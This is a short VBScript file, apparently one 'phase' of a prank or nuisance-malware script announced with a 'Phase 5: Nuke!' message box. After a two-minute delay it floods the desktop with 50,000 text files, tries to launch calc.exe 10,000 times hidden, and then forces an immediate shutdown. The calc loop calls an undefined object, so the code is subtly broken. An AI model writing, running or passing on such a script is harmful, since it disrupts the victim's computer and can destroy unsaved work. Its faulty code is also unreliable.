WScript.Sleep 120000
MsgBox "Phase 5: Nuke!"
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

desktop = shell.SpecialFolders("Desktop")

For i = 1 To 50000
    filePath = desktop & "\text" & i & ".txt"
    
    Set file = fso.CreateTextFile(filePath, True)
    file.WriteLine "hi!"
    file.Close
Next
set shell = CreateObject("WScript.Shell")
Dim c
For c = 1 To 10000
shShell.Run "calc.exe", 0, False
Next
WScript.Sleep 30000

Set shell = CreateObject("WScript.Shell")
shell.Run "shutdown -s -t 0"